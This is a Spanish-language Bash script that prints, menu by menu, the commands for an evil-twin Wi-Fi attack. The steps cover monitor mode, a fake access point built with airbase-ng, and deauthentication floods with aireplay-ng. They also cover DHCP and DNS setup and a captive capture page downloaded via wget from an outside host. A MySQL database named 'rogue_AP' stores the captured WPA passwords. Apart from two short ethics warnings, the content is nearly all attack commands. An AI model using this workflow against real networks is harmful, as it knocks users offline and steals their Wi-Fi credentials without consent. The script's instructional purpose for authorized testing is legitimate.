#!/bin/bash

# Autor: ING. Angel Gil -- The_White_Hat_?
# Script de Explicación Avanzada sobre Redes y Seguridad
# Este script NO ejecuta comandos, solo explica su función y uso detalladamente.

# Función para mostrar el menú principal
show_menu() {
    clear
    printf "\n\033[1;36m==================================================\033[0m\n"
    printf "\033[1;32m|   ⚡ Configuración de Redes y Seguridad ⚡   |\033[0m\n"
    printf "\033[1;32m|        \033[1;33mBy ING. Angel Gil -- The_White_Hat_? \033[1;32m       |\033[0m\n"
    printf "\033[1;36m==================================================\033[0m\n"
    printf "\033[1;34m1. 📡 Configurar un Punto de Acceso Falso (Fake AP)\033[0m\n"
    printf "\033[1;34m2. 🌐 Configurar DNS y Asignación de IP\033[0m\n"
    printf "\033[1;34m3. 🔧 Crear Interfaz Virtual at0\033[0m\n"
    printf "\033[1;34m4. 🛑 Enviar Paquetes de Desautenticación\033[0m\n"
    printf "\033[1;34m5. 🖥️ Crear Página Web de Captura\033[0m\n"
    printf "\033[1;34m6. 🗄️ Configurar Base de Datos MySQL\033[0m\n"
    printf "\033[1;31m7. ❌ Salir\033[0m\n"
    printf "\033[1;36m==================================================\033[0m\n"
    printf "Seleccione una opción: "
}



# Explicación y sintaxis de los comandos para la configuración de MySQL
explain_database_creation() {
    clear
    printf "\n\033[1;35m==================================================\n"
    printf "|     🗄️ Configuración de la Base de Datos MySQL  |\n"
    printf "==================================================\033[0m\n"

    printf "\n🔹 \033[1;33mPaso 1: Iniciar sesión en MySQL\033[0m\n"
    printf "  📌 Comando: \033[1;32mmysql -uroot\033[0m\n"
    printf "  ➜ Inicia sesión en MySQL como usuario root.\n"

    printf "\n🔹 \033[1;33mPaso 2: Crear una nueva base de datos\033[0m\n"
    printf "  📌 Comando: \033[1;32mcreate database rogue_AP;\033[0m\n"
    printf "  ➜ Crea una base de datos llamada 'rogue_AP' para almacenar credenciales capturadas.\n"

    printf "\n🔹 \033[1;33mPaso 3: Usar la base de datos creada\033[0m\n"
    printf "  📌 Comando: \033[1;32muse rogue_AP;\033[0m\n"
    printf "  ➜ Indica a MySQL que las siguientes operaciones se realizarán en esta base de datos.\n"

    printf "\n🔹 \033[1;33mPaso 4: Crear una tabla para almacenar contraseñas\033[0m\n"
    printf "  📌 Comando: \033[1;32mcreate table wpa_keys(password1 varchar(32), password2 varchar(32));\033[0m\n"
    printf "  ➜ Genera una tabla con dos columnas donde se guardarán las contraseñas capturadas.\n"

    printf "\n🔹 \033[1;33mPaso 5: Insertar un valor de prueba\033[0m\n"
    printf "  📌 Comando: \033[1;32mINSERT INTO wpa_keys (password1, password2) VALUES ('hola', 'hola');\033[0m\n"
    printf "  ➜ Agrega un registro de prueba a la base de datos.\n"

    printf "\n🔹 \033[1;33mPaso 6: Crear un usuario de MySQL para la web\033[0m\n"
    printf "  📌 Comando: \033[1;32mcreate user fakeap@localhost identified by 'fakeap';\033[0m\n"
    printf "  ➜ Crea un usuario 'fakeap' con contraseña 'fakeap' que tendrá acceso a la base de datos.\n"

    printf "\n🔹 \033[1;33mPaso 7: Conceder permisos al usuario\033[0m\n"
    printf "  📌 Comando: \033[1;32mGRANT ALL PRIVILEGES ON rogue_AP.* TO 'fakeap'@'localhost' IDENTIFIED BY 'fakeap';\033[0m\n"
    printf "  ➜ Da todos los permisos sobre la base de datos 'rogue_AP' al usuario 'fakeap'.\n"

    printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
    read -r
}





# Explicación y sintaxis de los comandos para Fake AP
explain_fake_ap() {
    clear
    printf "\n\033[1;35m==================================================\n"
    printf "|          📡 Configuración de un Fake AP       |\n"
    printf "==================================================\033[0m\n"

    printf "\n🔹 \033[1;33mPaso 1: Iniciar la interfaz en modo monitor\033[0m\n"
    printf "  📌 Comando: \033[1;32mairmon-ng start wlan0\033[0m\n"
    printf "  ➜ Activa la interfaz en modo monitor para capturar tráfico sin conexión.\n"

    printf "\n🔹 \033[1;33mPaso 2: Matar procesos que interfieran\033[0m\n"
    printf "  📌 Comando: \033[1;32mairmon-ng check kill\033[0m\n"
    printf "  ➜ Cierra procesos en segundo plano que pueden interferir.\n"

    printf "\n🔹 \033[1;33mPaso 3: Escanear redes cercanas\033[0m\n"
    printf "  📌 Comando: \033[1;32mairodump-ng wlan0mon\033[0m\n"
    printf "  ➜ Muestra una lista de redes con información detallada.\n"

    printf "\n🔹 \033[1;33mPaso 4: Crear el Fake AP\033[0m\n"
    printf "  📌 Comando: \033[1;32mairbase-ng -e 'RedFalsa' -c 6 wlan0mon\033[0m\n"
    printf "  ➜ Genera un AP falso con el ESSID 'RedFalsa' en el canal 6.\n"

    printf "\n⚠️ \033[1;31mAdvertencia:\033[0m Usar con responsabilidad y ética.\n"
    printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
    read -r
}

# Explicación de DNS y Asignación de IP
explain_dns_ip() {
    clear
    printf "\n\033[1;35m==================================================\n"
    printf "|      🌐 Configuración de DNS y DHCP           |\n"
    printf "==================================================\033[0m\n"

    printf "\n🔹 \033[1;33mPaso 1: Configurar dnsmasq\033[0m\n"
    printf "  📌 Comando: \033[1;32mnano /etc/dnsmasq.conf\033[0m\n"
    printf "  ➜ Edita el archivo para definir rangos de IP y servidores DNS.\n"

    printf "\n🔹 \033[1;33mPaso 2: Asignar IP a la interfaz\033[0m\n"
    printf "  📌 Comando: \033[1;32mifconfig at0 192.168.2.1 netmask 255.255.255.0 up\033[0m\n"
    printf "  ➜ Establece la dirección IP para la interfaz virtual at0.\n"

    printf "\n🔹 \033[1;33mPaso 3: Activar reenvío de tráfico\033[0m\n"
    printf "  📌 Comando: \033[1;32mecho 1 > /proc/sys/net/ipv4/ip_forward\033[0m\n"
    printf "  ➜ Permite compartir la conexión entre interfaces.\n"

    printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
    read -r
}

# Explicación de la interfaz at0
explain_interface() {
    clear
    printf "\n\033[1;35m==================================================\n"
    printf "|      🔧 Creación de la Interfaz Virtual at0   |\n"
    printf "==================================================\033[0m\n"

    printf "\n🔹 \033[1;33mPaso 1: Configurar dirección IP\033[0m\n"
    printf "  📌 Comando: \033[1;32mifconfig at0 192.168.2.129 netmask 255.255.255.128 up\033[0m\n"

    printf "\n🔹 \033[1;33mPaso 2: Definir una ruta de red\033[0m\n"
    printf "  📌 Comando: \033[1;32mroute add -net 192.168.2.128 netmask 255.255.255.128 gw 192.168.2.129\033[0m\n"

    printf "\n🔹 \033[1;33mPaso 3: Habilitar reenvío de paquetes\033[0m\n"
    printf "  📌 Comando: \033[1;32mecho 1 | tee /proc/sys/net/ipv4/ip_forward\033[0m\n"

    printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
    read -r
}

# Explicación de la desautenticación
explain_deauth() {
    clear
    printf "\n\033[1;35m==================================================\n"
    printf "|      🛑 Envío de Paquetes de Desautenticación |\n"
    printf "==================================================\033[0m\n"

    printf "\n🔹 \033[1;33mPaso 1: Poner la interfaz en modo monitor\033[0m\n"
    printf "  📌 Comando: \033[1;32mairmon-ng start wlan0\033[0m\n"

    printf "\n🔹 \033[1;33mPaso 2: Capturar tráfico en la red\033[0m\n"
    printf "  📌 Comando: \033[1;32mairodump-ng --bssid XX:XX:XX:XX:XX:XX -c 6 wlan0mon\033[0m\n"

    printf "\n🔹 \033[1;33mPaso 3: Enviar paquetes de desautenticación\033[0m\n"
    printf "  📌 Comando: \033[1;32maireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan0mon\033[0m\n"

    printf "\n⚠️ \033[1;31mAdvertencia:\033[0m Solo para pruebas de seguridad autorizadas.\n"
    printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
    read -r
}

# Explicación y sintaxis de los comandos para la creación de la web
explain_web_creation() {
    clear
    printf "\n\033[1;35m==================================================\n"
    printf "|      🖥️ Creación de la Página Web de Captura    |\n"
    printf "==================================================\033[0m\n"

    printf "\n🔹 \033[1;33mPaso 1: Moverse al directorio web\033[0m\n"
    printf "  📌 Comando: \033[1;32mcd /var/www/html\033[0m\n"
    printf "  ➜ Cambia al directorio donde se almacenarán los archivos del sitio web.\n"

    printf "\n🔹 \033[1;33mPaso 2: Descargar los archivos necesarios\033[0m\n"
    printf "  📌 Comando: \033[1;32mwget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip\033[0m\n"
    printf "  ➜ Descarga un archivo comprimido que contiene la página web de captura.\n"

    printf "\n🔹 \033[1;33mPaso 3: Extraer archivos\033[0m\n"
    printf "  📌 Comando: \033[1;32munzip Rogue_AP.zip\033[0m\n"
    printf "  ➜ Extrae el contenido del archivo descargado.\n"

    printf "\n🔹 \033[1;33mPaso 4: Limpiar archivos innecesarios\033[0m\n"
    printf "  📌 Comando: \033[1;32mrm -rf __MACOSX Rogue_AP.zip\033[0m\n"
    printf "  ➜ Elimina archivos residuales para mantener el directorio limpio.\n"

    printf "\n🔹 \033[1;33mPaso 5: Mover archivos a la ubicación correcta\033[0m\n"
    printf "  📌 Comando: \033[1;32mmv Rogue_AP/* .\033[0m\n"
    printf "  ➜ Mueve los archivos extraídos al directorio web principal.\n"

    printf "\n🔹 \033[1;33mPaso 6: Iniciar servicios web\033[0m\n"
    printf "  📌 Comando: \033[1;32mservice apache2 start && service mysql start\033[0m\n"
    printf "  ➜ Inicia los servicios de Apache y MySQL para que la web funcione.\n"

    printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
    read -r
}

# Bucle principal del menú
while true; do
    show_menu
    read -r choice
    case $choice in
        1) explain_fake_ap ;;
        2) explain_dns_ip ;;
        3) explain_interface ;;
        4) explain_deauth ;;
        5) explain_web_creation ;;
        6) explain_database_creation ;;
        7) printf "\n\033[1;31mSaliendo... ¡Hasta luego!\n\033[0m"; exit 0 ;;
        *) printf "\n\033[1;31mOpción no válida. Intente de nuevo.\n\033[0m"; sleep 2 ;;
    esac
done
